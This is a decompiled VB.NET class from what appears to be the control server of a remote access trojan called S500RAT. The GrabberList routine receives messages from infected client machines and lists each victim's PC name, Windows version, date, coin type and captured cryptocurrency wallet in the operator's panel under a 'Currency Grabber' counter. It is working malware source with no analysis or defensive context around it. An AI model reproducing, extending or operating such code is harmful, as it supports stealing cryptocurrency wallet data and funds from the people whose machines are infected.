Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000063 RID: 99
	Public Class GrabberList
		' Token: 0x060011C4 RID: 4548 RVA: 0x0009E9A8 File Offset: 0x0009CBA8
		Public Shared Sub AddArray(Client_0 As Clients, unpack_msgpack As MsgPack)
			Dim flag As Boolean = Client_0 Is Nothing
			If flag Then
				Throw New ArgumentNullException("Client_0")
			End If
			Dim item As DataGridViewRow = New DataGridViewRow() With { .Height = 30 }
			Try
				item.Cells.Add(New DataGridViewImageCell() With { .Value = DataB.form1_0.IMAGMiningL1.Images(unpack_msgpack.ForcePathObject("Coin").AsString + ".png"), .ImageLayout = DataGridViewImageCellLayout.Zoom })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("PC").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Win").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Date").AsString })
				item.Cells.Add(New DataGridViewTextBoxCell() With { .Value = unpack_msgpack.ForcePathObject("Wallet").AsString })
				item.Resizable = DataGridViewTriState.[False]
			Catch ex As Exception
				ListLogs.AddArray("Currency Grabber! : " + ex.Message, 0)
				Return
			End Try
			DataB.form1_0.Invoke(New MethodInvoker(Sub()
				DataB.form1_0.CurrencyL1.Rows.Add(item)
				DataB.form1_0.NumListCurrencyGrabber.Text = Conversions.ToString(DataB.form1_0.CurrencyL1.Rows.Count) + "+"
			End Sub))
		End Sub
	End Class
End Namespace
